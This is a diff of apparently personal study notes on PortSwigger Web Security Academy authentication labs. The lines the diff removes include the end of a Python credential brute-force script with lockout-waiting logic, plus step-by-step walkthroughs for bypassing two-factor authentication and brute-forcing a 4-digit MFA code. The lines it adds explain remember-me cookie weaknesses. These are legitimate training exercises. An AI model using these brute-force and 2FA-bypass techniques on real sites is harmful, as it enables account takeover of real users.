-            with open(args.csv, 'w', newline='', encoding='utf-8') as f:
-                w = csv.writer(f)
-                w.writerow(('phase', 'user', 'pass', 'status', 'note'))
-                w.writerows(rows)
-        return 1
-
-    # ---------- wait for the lock to reset ----------
-    print(f'[*] waiting {args.wait:.0f}s for the account lock to reset',
-          file=sys.stderr)
-    time.sleep(args.wait)
-
-    # ---------- PHASE 2: crack the password ----------
-    print(f'[*] PHASE 2: {len(passwords)} passwords for {valid}', file=sys.stderr)
-    hits: list[tuple[str, str, int]] = []
-    for u in valid:
-        for pw in passwords:
-            r = post(u, pw)
-            if r is None:
-                continue
-            body = r.text or ''
-            status = r.status_code
-            rows.append(('pass', u, pw, status,
-                         'lock' if lock_re.search(norm(body)) else ''))
-            n = norm(body)
-            if status in (301, 302, 303, 307, 308):
-                print(f'[+] HIT {u}:{pw} status={status}', file=sys.stderr)
-                hits.append((u, pw, status))
-                break
-            if not invalid_re.search(n) and not lock_re.search(n):
-                print(f'[+] HIT {u}:{pw} status={status} (no error message)',
-                      file=sys.stderr)
-                hits.append((u, pw, status))
-                break
-
-    if args.csv:
-        with open(args.csv, 'w', newline='', encoding='utf-8') as f:
-            w = csv.writer(f)
-            w.writerow(('phase', 'user', 'pass', 'status', 'note'))
-            w.writerows(rows)
-        print(f'[*] CSV: {args.csv}', file=sys.stderr)
-
-    if hits:
-        for u, pw, st in hits:
-            print(f'HIT {u}:{pw} ({st})')
-        return 0
-    print('[-] password not found', file=sys.stderr)
-    return 1
-
-
-if __name__ == '__main__':
-    sys.exit(main())
-```
 
 ##### Reference
 
@@ -1344,6 +401,11 @@ This lab's two-factor authentication can be bypassed. You have already obtained 
 <details>
 <summary>Lab details, screenshots & walkthrough 0.6</summary>
 
+To solve the lab, access Carlos's account page.
+
+- Your credentials: wiener:peter
+- Victim's credentials carlos:montoya
+
 **Screenshots:**
 
 ![01-login](images/lab-0.6-2fa-simple-bypass/01-login.png)
@@ -1359,22 +421,6 @@ This lab's two-factor authentication can be bypassed. You have already obtained 
 ![06-code](images/lab-0.6-2fa-simple-bypass/06-code.png)
 
 ![07-solved](images/lab-0.6-2fa-simple-bypass/07-solved.png)
-
-
-To solve the lab, access Carlos's account page.
-
-- Your credentials: wiener:peter
-- Victim's credentials carlos:montoya
-
-##### Tutorial
-
-1. Log in with your own account (`wiener:peter`) and open the **Email client** (exploit server) — this lab emails the 2FA code to the address you control
-2. Read the 4-digit `security code` from the email client, submit it on the login page, and confirm you land on **My account** (`Your username is: wiener`)
-3. Log out, then log in with the victim's credentials (`carlos:montoya`) — the server redirects to the 2FA prompt (`Enter your 4-digit security code`) and you do not have that code
-4. Instead of guessing, drop the `/login` path from the URL and request **`/my-account` directly** — the session is already authenticated, so the 2FA step is skipped
-5. The page returns `Your username is: carlos` (`carlos@carlos-montoya.net`) — the lab registers `is-solved` and shows `Congratulations, you solved the lab`
-
-**Key point:** 2FA was enforced on the login flow only. `/my-account` was protected by the session cookie alone, so navigating to it directly bypasses the second factor.
 
 ##### Reference
 
@@ -1446,6 +492,11 @@ This lab's two-factor authentication is vulnerable due to its flawed logic. To s
 <details>
 <summary>Lab details, screenshots & walkthrough 0.7</summary>
 
+To solve the lab, access Carlos's account page.
+
+- Your credentials: wiener:peter
+- Victim's username: carlos
+
 **Screenshots:**
 
 ![01-login-wiener](images/lab-0.7-2fa-broken-logic/01-login-wiener.png)
@@ -1465,34 +516,6 @@ This lab's two-factor authentication is vulnerable due to its flawed logic. To s
 ![08-response-url](images/lab-0.7-2fa-broken-logic/08-response-url.png)
 
 ![09-solved](images/lab-0.7-2fa-broken-logic/09-solved.png)
-
-
-To solve the lab, access Carlos's account page.
-
-- Your credentials: wiener:peter
-- Victim's username: carlos
-
-##### Tutorial
-
-1. Log in with your own account (`wiener:peter`) → the server redirects to `/login2` and emails a 4-digit code; this confirms the 2FA flow works
-2. Log out, then send `GET /login2?verify=carlos` — the server generates a fresh 4-digit code for **carlos** (the victim)
-3. Go to `/login` and log in as `carlos` with any password + a wrong 2FA code, then capture `POST /login2`
-4. Note that `POST /login2` trusts the `verify` parameter to decide whose code to check — set `verify=carlos`
-5. Brute-force `mfa-code` from `0000`–`9999` (only 4 digits, and the code is not tied to your session)
-6. A `302` response means the code is correct → open that response in the browser
-7. Click **My account** → `Your username is: carlos` → the lab registers `is-solved` and shows `Congratulations, you solved the lab`
-
-**Key point:** `verify` is client-controlled, so an attacker can request a code for any account and brute-force the 4-digit MFA code without ever owning that account.
-
-**Tool:** `tools/2fa-broken-logic.py`
-
-```bash
-python3 "2fa-broken-logic.py" \
-  --url "https://<id>.web-security-academy.net/login2" \
-  --cookie "session=...; verify=carlos" \
-  --self-user wiener --self-pass peter \
-  --victim carlos
-```
 
 ##### Reference
 
@@ -1518,13 +541,81 @@ Purpose: This video shows the lab solution of "2FA broken logic" from Web Securi
 
 ### Brute-forcing 2FA verification codes
 
+As with passwords, websites need to take steps to prevent brute-force of the 2FA verification code. This is especially important because the code is often a simple 4 or 6-digit number. Without adequate brute-force protection, cracking such a code is trivial.
+
+Some websites attempt to prevent this by automatically logging a user out if they enter a certain number of incorrect verification codes. This is ineffective in practice because an advanced attacker can even automate this multi-step process by creating macros for Burp Intruder. The Turbo Intruder extension can also be used for this purpose.
+
 ## Vulnerabilities in other authentication mechanisms
+
+In addition to the basic login functionality, most websites provide supplementary functionality to allow users to manage their account. For example, users can change their password or reset their password when they forget it. These mechanisms can also introduce vulnerabilities that can be exploited by an attacker.
+
+Websites usually take care to avoid well-known vulnerabilities in their login pages. But is easy to overlook the fact that you need to take similar steps to ensure that related functionality is equally as robust. This is espicially important in cases where an attacker is able to create their own account and, consequently has easy access to study these additional pages.
 
 ### Keeping users logged in
 
+A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in".
+
+This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie. As possessing this cookie effectively allows you to bypass the entire login process, it is best practice for this cookie to be impractical to guess. However, some websites generate this cookie based on a predicatable concatenation of static values, such as the username and a timestamp. Some even use the password as part of cookie. This approach is particularly dangerous if an attacker is able to create their own account because they can study their own cookie and potentially, deduce how it is generated. Once they work out the formula, they can try to brute-force other users cookie to gain access to their accounts.
+
+### Keeping users logged in - Continue
+
+Some websites assume that if the cookie is encrypted in some way it will not be guessable even if it does use static values. While this may be true if done correctly, naively "encrypting" the cookie using a simple two-way encoding like Base64 offers no protection whatsoever. Even using proper encryption with a one-way hash function is not completely bulletproof. If the attacker is able to easily identify the hashing algorithm, and no salt is used, they can potentially brute-force the cookie by simply hashing their wordlists. This method can be used to bypass login attempt limits if a similar limit isn't applied to cookie guesses.
+
+Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. Using the usual techniques, such as XSS, an attacker could steal another user's "remember me" cookie and deduce how the cookie is constructed from that. If the website was built using an open-source framework, the key details of the cookie construction may even be publicly documented.
+
 ##### Lab: Brute-forcing a stay-logged-in cookie
 
+This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
+
+<details>
+<summary>Lab details, screenshots & walkthrough 0.8</summary>
+
+To solve the lab, brute-force Carlos's cookie to gain access to his *My account* page.
+
+- Your credentials: `wiener:peter`
+- Victim's username: `carlos`
+- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
+
+**Screenshots:**
+
+![01-login-wiener](images/lab-0.8-bruteforcing-stay-logged-in-cookie/01-login-wiener.png)
+
+![02-cookie-value](images/lab-0.8-bruteforcing-stay-logged-in-cookie/02-cookie-value.png)
+
+![03-terminal-bruteforce](images/lab-0.8-bruteforcing-stay-logged-in-cookie/03-terminal-bruteforce.png)
+
+![04-found-password](images/lab-0.8-bruteforcing-stay-logged-in-cookie/04-found-password.png)
+
+![05-solved](images/lab-0.8-bruteforcing-stay-logged-in-cookie/05-solved.png)
+
+##### Reference
+
+<details>
+<summary>12. Authentication Vulnerabilities - Lab #9 Brute-forcing a stay-logged-in cookie — Rana Khalil</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=dpcrsQ2nhBo
+Purpose: In this video, we cover Lab #9 in the Authentication module of the Web Security Academy. This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.
+
+</details>
+
+</details>
+
+### Keeping users logged in - Continued
+
+In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it hashed. Hashed versions of well-known password lists are available online, so if the user's password appears in one these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. This demonstrates the importance of salt in effective encryption.
+
 ##### Lab: Offline password cracking
+
+This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerabilitiy in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.
+
+<details>
+<summary>Lab details, screenshots & walkthrough 0.9</summary>
+
+- Your credentials:`wiener:peter`
+- Victim's username:`carlos`
+
+</details>
 
 ### Resetting user passwords
 
